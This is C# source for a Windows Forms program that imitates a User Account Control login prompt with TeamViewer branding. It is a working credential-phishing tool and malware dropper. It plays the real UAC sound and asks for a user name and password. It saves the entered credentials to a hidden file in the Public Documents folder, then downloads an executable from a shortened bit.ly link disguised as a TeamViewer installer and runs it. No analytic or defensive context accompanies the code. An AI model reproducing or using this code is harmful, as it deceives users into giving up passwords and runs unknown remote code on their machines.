using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace uac
{
    public partial class Form1 : Form
    {
        private static string test;
        private static string currentUserName = Environment.UserName;
        private static string currentDomain = Environment.UserDomainName;
        private static string fileUrl = "https://bit.ly/40dN90f";
        private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\TeamViewer_Setup_x64.exe";

        public Form1()
        {
            InitializeComponent();
            this.CenterToScreen();
            this.FormBorderStyle = FormBorderStyle.None;
            SoundPlayer sound = new SoundPlayer(@"C:\Windows\Media\Windows User Account Control.wav");
            sound.Play();
            this.label4.Text = currentDomain;
            this.Icon = Properties.Resources.TeamViewer_Logo_Icon_Only;

        }


        private void button2_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.textBox1.Text = "User name";
            this.textBox2.Text = "Password";
            this.textBox1.ForeColor = Color.Gray;
            this.textBox2.ForeColor = Color.Gray;
            this.textBox1.Cursor = Cursors.IBeam;
            button1.Focus();
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            if(textBox1.Text == "User name")
            {
                this.textBox1.ForeColor = Color.Black;
                this.textBox1.Text = "";
            }
        }

        private void textBox1_Leave(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                this.textBox1.ForeColor = Color.Gray;
                this.textBox1.Text = "User name";
            }
        }

        private void textBox2_Enter(object sender, EventArgs e)
        {
            if (textBox2.Text == "Password")
            {
                this.textBox2.ForeColor = Color.Black;
                this.textBox2.Text = "";
                this.textBox2.PasswordChar = '●';
            }
        }

        private void textBox2_Leave(object sender, EventArgs e)
        {
            if (textBox2.Text == "")
            {
                this.textBox2.ForeColor = Color.Gray;
                this.textBox2.Text = "Password";
                this.textBox2.PasswordChar = '\0';
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            string computerName = Environment.MachineName;
            string formatted = string.Format("{0}\n{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
            if (File.Exists(@"C:\Users\Public\Documents\creds.txt"))
            {
                File.Delete(@"C:\Users\Public\Documents\creds.txt");
            }
            using (StreamWriter writer = new StreamWriter(@"C:\Users\Public\Documents\creds.txt"))
            {
                writer.WriteLine(formatted);
            }
            File.SetAttributes(@"C:\Users\Public\Documents\creds.txt", FileAttributes.Hidden);

            //DialogResult result = MessageBox.Show("Failed to authenticate user.\n\nAccess denied or timeout expired\nCheck if you have local administrator privilages on computer '" + computerName + "'\n\nPossible reasons:\n1. Invalid credentials" , "User Account Control", MessageBoxButtons.OK, MessageBoxIcon.Error);

            //Thread.Sleep(3000);
            this.Hide();
            Teamviewer pgBar = new Teamviewer();
            
            pgBar.Show();
            pgBar.BringToFront();
            downloadExe(pgBar);
            
        }

        public void downloadExe(Teamviewer pgBar)
        {
            using (WebClient client = new WebClient())
            {
                client.DownloadProgressChanged += (sender, e) =>
                {
                    // Update progress bar on the ProgressForm
                    pgBar.SetProgressValue(e.ProgressPercentage);
                };

                client.DownloadFileCompleted += (sender, e) =>
                {
                    // Close the ProgressForm when download is complete
                    try
                    {
                        Process.Start(fileName);
                        
                    }
                    catch(Exception ex)
                    {
                        Application.Exit();
                    }
                    //pgBar.Close();
                    Application.Exit();
                };

                client.DownloadFileAsync(new Uri(fileUrl), fileName);
            }
        }

        

        private void button3_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void button3_MouseEnter(object sender, EventArgs e)
        {
            button3.BackColor = Color.FromArgb(240, 0, 0);

            button3.ForeColor = Color.White;
        }

        private void button3_MouseLeave(object sender, EventArgs e)
        {
            button3.BackColor = Color.FromArgb(118, 185, 237);

            button3.ForeColor = Color.Black;
        }

    }
}
